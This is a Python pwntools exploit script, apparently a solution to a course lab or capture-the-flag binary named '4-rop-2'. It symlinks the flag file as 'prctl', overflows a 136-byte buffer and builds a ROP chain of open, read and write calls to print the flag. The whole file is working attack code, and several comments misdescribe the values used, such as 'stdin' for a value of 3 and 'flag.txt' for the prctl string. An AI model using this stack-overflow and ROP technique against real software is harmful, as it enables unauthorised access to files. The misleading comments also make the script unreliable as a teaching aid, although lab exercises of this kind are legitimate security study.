#!/usr/bin/env python
#@author: Ramin Nourbakhsh


from pwn import *
from shutil import copyfile
import subprocess

#set up prctl file so its a symlink to the flag and make the file executable
subprocess.run(['ln', '-s', '/home/labs/unit3/4-rop-2/flag', './prctl'])
subprocess.run(['chmod', '+x', './prctl'])

# Load the binary
elf = ELF('./4-rop-2')

# Gadgets
pop_rdi = int('0x0000000000400743', 16)
pop_rsi_pop_r15 = int('0x0000000000400741', 16)
pop_rdx = int('0x0000000000400668', 16)

# Writable memory address (.bss section)
writable_mem_addr = int('0x0000000000601050', 16)
flag_string = int('0x000000000040038a', 16) #address of prctl string 


# Create payload
payload = b'A' * 136  # Fill buffer until the return address

# Step 0: open("flag.txt", O_RDONLY) - open the flag file
payload += p64(pop_rdi)              # pop rdi; ret
payload += p64(flag_string)
#payload += p64(b"flag\x00".ljust(8, b'\x00'))
payload += p64(pop_rsi_pop_r15)      # pop rsi; pop r15; ret
payload += p64(0)                    # rsi = 0 (O_RDONLY)
payload += p64(0)                    # r15 = junk (alignment)
payload += p64(elf.plt['open'])      # Call open@plt

# Step 1: read(0, writable_mem_addr, 0x100) from stdin into .bss
payload += p64(pop_rdi)              # pop rdi; ret
payload += p64(3)                    # rdi = 0 (stdin)
payload += p64(pop_rsi_pop_r15)      # pop rsi; pop r15; ret
payload += p64(writable_mem_addr)    # rsi = writable memory address
payload += p64(0)                    # r15 = junk
payload += p64(pop_rdx)              # pop rdx; ret
payload += p64(0x100)                # rdx = 0x100 (number of bytes to read)
payload += p64(elf.plt['read'])      # Call read@plt

# Step 2: write(1, writable_mem_addr, 0x100) output to stdout
payload += p64(pop_rdi)              # pop rdi; ret
payload += p64(1)                    # rdi = 1 (stdout)
payload += p64(pop_rsi_pop_r15)      # pop rsi; pop r15; ret
payload += p64(writable_mem_addr)    # rsi = writable memory address
payload += p64(0)                    # r15 = junk
payload += p64(pop_rdx)              # pop rdx; ret
payload += p64(0x100)                # rdx = 0x100 (number of bytes to write)
payload += p64(elf.plt['write'])     # Call write@plt

# Run the exploit
p = elf.process()
p.sendline(payload)
p.interactive()
p.close
#the flag should be on the screen after you run this script!